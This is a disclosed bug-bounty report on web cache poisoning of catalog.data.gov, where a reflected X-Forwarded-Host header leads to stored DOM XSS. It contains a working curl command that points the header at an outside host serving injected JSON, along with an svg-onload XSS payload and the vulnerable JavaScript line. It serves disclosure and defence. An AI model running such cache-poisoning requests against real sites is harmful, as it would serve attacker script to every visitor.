# Defacement of catalog.data.gov via web cache poisoning to stored DOMXSS

## Report Details
- **Report ID**: 303730
- **URL**: https://hackerone.com/reports/303730
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-01-10T12:23:37.143Z
- **Disclosed**: 2018-11-01T21:16:04.418Z

## Reporter
- **Username**: albinowax
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gsa_bbp

## Vulnerability Information
An attacker can deface various pages on catalog.data.gov, leading to them executing malicious JavaScript when visited by a normal user.

The root problem is that the server trusts the X-Forwarded-Host HTTP header, and uses this to populate the 'data-site-root' and 'data-locale-root' attributes on the <body tag. Some JavaScript then fetches a JSON file from the URL specified in these attributes, and writes the response to the page without escaping it, leading to a DOMXSS vulnerability.

This behaviour is harmless by itself, since I can't make a victim send a malicious HTTP header. Fortunately for me, I can ensure that the poisoned response sent to me is cached by CloudFront, meaning my payload will be served to loads of other users. 

Please be careful when exploring this issue, as it's potentially quite easy to accidentally poison CloudFront's cache and antagonise your visitors. To safely replicate this issue, you can use the following steps:

1. Run curl command to poison cache:
curl -i -s -k  -X $'GET' \
    -H $'Host: catalog.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: */*' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H $'Connection: close' \
    $'https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6' > /dev/null

2. Visit the poisoned page:
https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6

3. Wait for a few seconds, and observe the popup caused by our injected alert(document.domain)

Behind the scenes, step 1 poisons the cache with a data-site-root value of 'portswigger-labs.net/catalog.data.gov_json_xss/json.php'. In step 2, some JavaScript fetches our json.php file from portswigger-labs.net, and uses our 'show more' JSON attribute to translate the 'show more' text on https://catalog.data.gov/dataset/consumer-complaint-database into "Mostrar más <svg onload=alert(document.domain)>"

This is the offending line of JavaScript:
var template_more = ['<tr class="toggle-show toggle-show-more">', '<td colspan="' + cols + '">', '<small>', '<a href="#" class="show-more">' + this.i18n('show_more') + '</a>', '<a href="#" class="show-less">' + this.i18n('show_less') + '</a>', '</small>', '</td>', '</tr>'].join('\n');

To mitigate this issue, I recommend addressing the X-Forwarded-Host reflection. 

Please let me know if you have any questions.

Cheers,

James & Gareth

## Impact

An attacker can deface most pages on catalog.data.gov.

## Attachments
- Screen_Shot_2018-01-10_at_12.11.01.png
- Screen_Shot_2018-01-10_at_12.13.45.png
